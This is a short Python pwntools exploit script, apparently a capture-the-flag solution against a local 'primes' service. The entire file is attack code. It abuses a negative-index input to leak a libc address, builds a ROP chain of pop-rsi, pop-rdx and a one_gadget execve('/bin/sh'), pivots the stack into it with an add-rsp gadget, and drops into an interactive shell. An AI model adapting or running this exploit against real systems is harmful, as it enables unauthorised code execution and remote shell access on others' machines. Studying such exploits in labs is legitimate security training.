from pwn import *
import re


# 0x00000000000a4035 : add rsp, 0x58 ; ret
add_rsp_ret_offset = 0xA4035


# 0x0000000000030081 : pop rsi ; ret
pop_rsi_ret_offset = 0x30081

# 0x0000000000120272 : pop rdx ; ret
pop_rdx_ret_offset = 0x120272

# 0xeecd2 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
one_gadget_offset = 0xEECD2

# p = process("./build/primes")
# p = gdb.debug("./build/primes")
p = remote("localhost", 1024)

p.recvuntil(b"?")
p.sendline(b"-10")

out = p.recvuntil(b"] ")
regex = re.compile(b".*?(\d+)")
m = regex.match(out)
if m is None:
    log.critical("Could not get leak")

dl_runtime_resolve = int(m.group(1))
log.info(f"dl_runtime_resolve @ {hex(dl_runtime_resolve)}")

dl_runtime_resolve_to_dl_base_offset = 0x18EE0
dl_to_libc_offset = 0x22C000
libc_base = (
    dl_runtime_resolve - dl_runtime_resolve_to_dl_base_offset - dl_to_libc_offset
)
log.info(f"libc_base @ {hex(libc_base)}")


rop_chain = bytearray()
rop_chain += p64(libc_base + pop_rsi_ret_offset)
rop_chain += p64(0x0)  # rsi=0x0
rop_chain += p64(libc_base + pop_rdx_ret_offset)
rop_chain += p64(0x0)  # rdx=0x0
rop_chain += p64(libc_base + one_gadget_offset)
rop_start = libc_base + add_rsp_ret_offset

p.sendline(rop_chain)
p.recvuntil(b"?\n")
p.sendline(str(rop_start).encode())
p.recvuntil(b"!\n")
p.interactive()
